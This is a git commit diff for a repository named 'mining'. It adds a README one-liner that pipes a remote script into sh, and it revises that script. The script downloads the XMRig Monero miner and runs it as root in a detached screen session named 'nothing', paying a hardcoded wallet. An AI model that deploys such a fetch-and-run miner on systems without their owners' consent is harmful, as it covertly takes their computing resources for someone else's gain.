e5dd7071636f937b586788ece2dba08ce3865404
MszBednarski <msz.bednarski@gmail.com>
2022-03-12 13:04:37 +0000

    done :clap:

--- README.md
+++ README.md
@@ -1,1 +1,5 @@
 # mining
+
+```bash
+curl https://raw.githubusercontent.com/MszBednarski/mining/main/get-miner.sh | sh
+```
--- get-miner.sh
+++ get-miner.sh
@@ -1,7 +1,8 @@
 #!/bin/sh -e
-sudo apt-get update
-sudo apt-get install -y curl msr-tools
+apt-get update
+apt-get install -y curl msr-tools
 MSR_FILE=/sys/module/msr/parameters/allow_writes
+export ADDR=49ERscAZekwbCDZ3MqV2rhEwTqx1UbihGFCeSRK7Vsy8f6EA5xH151JRmvhAoV2sta2U9eV6CgeNt7u6jTfQ4WtYGbGQygd
 
 if test -e "$MSR_FILE"; then
 	echo on > $MSR_FILE
@@ -35,10 +36,19 @@ elif grep "Intel" /proc/cpuinfo > /dev/null;
 else
 	echo "No supported CPU detected"
 fi
-curl -Lv https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz -O
-# 49ERscAZekwbCDZ3MqV2rhEwTqx1UbihGFCeSRK7Vsy8f6EA5xH151JRmvhAoV2sta2U9eV6CgeNt7u6jTfQ4WtYGbGQygd
-# unpack
-tar -xvzf xmrig-6.16.4-linux-x64.tar.gz
-export ADDR=49ERscAZekwbCDZ3MqV2rhEwTqx1UbihGFCeSRK7Vsy8f6EA5xH151JRmvhAoV2sta2U9eV6CgeNt7u6jTfQ4WtYGbGQygd
-sudo chmod 0700 /root/xmrig-6.16.4/xmrig
-/root/xmrig-6.16.4/xmrig -o pool.minexmr.com:4444 -u $ADDR &
+
+if arch | grep x86_64 > /dev/null;
+	then
+        echo "Detected x86_64 assuming linux"
+        curl -L https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz -O
+        tar -xzf xmrig-6.16.4-linux-x64.tar.gz
+elif arch | grep arm64 > /dev/null;
+	then
+		echo "Detected arch 64 assuming m1 mac"
+        curl -L https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-macos-arm64.tar.gz -O
+        tar -xzf xmrig-6.16.4-macos-arm64.tar.gz
+else
+	echo "No supported arch detected"
+fi
+chmod +x ./xmrig-6.16.4/xmrig
+screen -dmS nothing xmrig-6.16.4/xmrig -o pool.minexmr.com:4444 -u $ADDR
